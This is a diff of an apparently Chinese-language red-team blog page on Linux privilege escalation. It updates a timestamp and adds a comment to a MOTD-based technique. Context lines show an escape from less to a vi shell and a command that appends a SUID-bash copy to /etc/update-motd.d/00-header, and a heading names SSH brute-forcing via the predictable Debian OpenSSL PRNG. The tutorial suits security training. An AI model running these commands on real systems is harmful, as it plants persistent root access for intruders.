@@ -24,7 +24,7 @@
 <meta property="og:description" content="「红队笔记」Linux 提权精讲Privilege Escation 可缩写为 PrivEsca 或 PE。提权操作存在的原因：应用程序通常是按需配置权限的 提权原理重要的权限体系 UGO 基本权限：Linux 操作系统中最常见的权限管理方式，UGO 分别代指文件所有者、组和其他人 补充知识点 1：目录的权限。对于目录来说，目录中存储的是该目录下文件&#x2F;目录名称的列表，因此如果一个用户拥有">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-07-04T02:32:21.000Z">
-<meta property="article:modified_time" content="2023-08-04T07:36:39.815Z">
+<meta property="article:modified_time" content="2023-10-17T05:48:08.779Z">
 <meta property="article:author" content="I3eg1nner">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -471,7 +471,7 @@
 <p>执行上述命令，在 less 界面按 v 键启动 vi 编辑状态。按照 vi 启动 shell 的命令语法，在 vi 中执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:!sh<br></code></pre></td></tr></table></figure>
 
-<h3 id="利用-MOTD-机制提权"><a href="#利用-MOTD-机制提权" class="headerlink" title="利用 MOTD 机制提权"></a>利用 MOTD 机制提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 枚举</span><br><span class="hljs-built_in">ls</span> -al /etc/update-motd.d/<br><br><span class="hljs-comment"># 利用</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /home/RedteamNotes/bash &amp;&amp; chmod u+s /home/RedteamNotes/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure>
+<h3 id="利用-MOTD-机制提权"><a href="#利用-MOTD-机制提权" class="headerlink" title="利用 MOTD 机制提权"></a>利用 MOTD 机制提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 枚举</span><br><span class="hljs-built_in">ls</span> -al /etc/update-motd.d/<br><br><span class="hljs-comment"># 找到可写的文件，且此文件是在登陆时自动执行的</span><br><br><span class="hljs-comment"># 利用</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /home/RedteamNotes/bash &amp;&amp; chmod u+s /home/RedteamNotes/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure>
 
 <h3 id="可预测-PRNG-暴力破解-SSH-提权"><a href="#可预测-PRNG-暴力破解-SSH-提权" class="headerlink" title="可预测 PRNG 暴力破解 SSH 提权"></a>可预测 PRNG 暴力破解 SSH 提权</h3><p>在 OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 的 debian 及衍生版本中有可预测伪随机谁生成机制的 SSH 暴力破解利用</p>
 <p>5622.txt 中介绍了使用方法。</p>
